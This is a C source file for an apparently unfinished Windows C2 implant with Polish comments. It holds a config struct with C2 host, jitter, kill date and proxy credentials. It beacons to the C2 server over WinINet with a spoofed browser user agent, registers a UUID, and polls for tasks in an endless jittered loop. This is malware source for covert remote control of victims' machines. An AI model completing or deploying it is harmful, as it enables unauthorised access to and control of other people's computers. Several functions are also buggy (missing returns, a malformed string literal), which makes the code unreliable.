#include <stdlib.h>
#include <stdint.h>
#include <windows.h>
#include <wininet.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include "cJSON.h"
typedef struct {
    int port; 
    int interval; 
    int jitter;
    int eec; //tak na prawdę to bool XD
    char host[256];
    char get_uri[64];
    char proxy_host[128];    //
    char post_uri[64];
    char query_path_name[64];
    char proxy_port[16]; //
    char proxy_user[64]; //
    char proxy_pass[64]; //
    char uuid[40];
    char killdate[32];  //
} implant_config;

char json_buff[250];

//implant_config config = {
//    .host = "REPLACE_ME_HOST",
//    .port = REPLACE_ME_PORT,     
//    .uuid = "REPLACE_ME_UUID",
//    .interval = REPLACE_ME_INTERVAL, //
//    .jitter = REPLACE_ME_JITTER,      //
//    .get_uri = "REPLACE_ME_GET_URI",  
//    .post_uri = "REPLACE_ME_POST_URI",
//    .query_path_name = "REPLACE_ME_QUERY_PATH_NAME",
//    .eec = REPLACE_ME_EEC,        
//    .proxy_host = "REPLACE_ME_PROXY_HOST", //
//    .proxy_port = "REPLACE_ME_PROXY_PORT", //
//    .proxy_user = "REPLACE_ME_PROXY_USER", // 
//    .proxy_pass = "REPLACE_ME_PROXY_PASS", //
//    .killdate = "REPLACE_ME_KILLDATE" //
//};

implant_config config = {
    .host = "REPLACE_ME_HOST",
    .port = 1337,     
    .uuid = "REPLACE_ME_UUID",
    .interval = 420, //
    .jitter = 69,      //
    .get_uri = "REPLACE_ME_GET_URI",  
    .post_uri = "REPLACE_ME_POST_URI",
    .query_path_name = "REPLACE_ME_QUERY_PATH_NAME",
    .eec = 1,        
    .proxy_host = "REPLACE_ME_PROXY_HOST", //
    .proxy_port = "PROXY_PORT", //
    .proxy_user = "REPLACE_ME_PROXY_USER", // 
    .proxy_pass = "REPLACE_ME_PROXY_PASS", //
    .killdate = "REPLACE_ME_KILLDATE" //
};

char* send_c2_post_request(char* json_data) {
    HINTERNET hInternet = InternetOpen("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;

    HINTERNET hConnect = InternetConnect(hInternet, config.host, config.port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hInternet); return; }

    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", config.post_uri, NULL, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return; }

    const char* headers = "Content-Type: application/json\r\n";
    
    if (HttpSendRequest(hRequest, headers, -1, json_data, strlen(json_data))) {
        printf("wysłano post'a\n");
        
        char buffer[1024];
        DWORD bytesRead;
        if (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
            char* response = (char*)malloc(bytesRead+1);
            memcpy(response,buffer,bytesRead);
            response[bytesRead] = '\0';
            return response;
        }
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}
char* checkin(){
        char json_checkin_buff[190];
    snprintf(json_checkin_buff,sizeof(json_checkin_buff),"{\"action\": \"checkin\", \"uuid\": \"%s\", \"os\": \"NOT IMPLEMENTED\", \"user\": \"NOT IMPLEMENTED\", \"host\": \"NOT IMPLEMENTED\", \"pid\": 0, \"architecture\": \"x64\"}",config.uuid);
    char* resp = send_c2_post_request(json_checkin_buff); //checkin do serwera
    cJSON *root = cJSON_Parse(resp);
    if (root !=NULL){
        cJSON *status = cJSON_GetObjectItemCaseSensitive(root, "status");
        cJSON *id = cJSON_GetObjectItemCaseSensitive(root, "id");
        cJSON *action = cJSON_GetObjectItemCaseSensitive(root, "action");
        if(strcmp(status->valuestring,"success") == 0 && cJSON_IsString(id) && !strcmp(action->valuestring,"checkin")){
            strncpy(config.uuid,id->valuestring,sizeof(config.uuid) - 1);
        }

    }
    free(resp);
    cJSON_Delete(root);
}
	
void get_tasks(){
send_c2_post_request('{"action": "get_tasking", "tasking_size": -1}');
return;
}

bool sleep_with_jitter(int interval, int jitter){
    int variation = (interval * jitter)/100;
    int sleep = (interval - variation) + rand()%(2*variation+1);
        Sleep(sleep * 1000);
return 0;
}



int main(){
	checkin();
//main loop
    for(;;){
        get_tasks();
        sleep_with_jitter(config.interval,config.jitter);

    }

	return 0;
}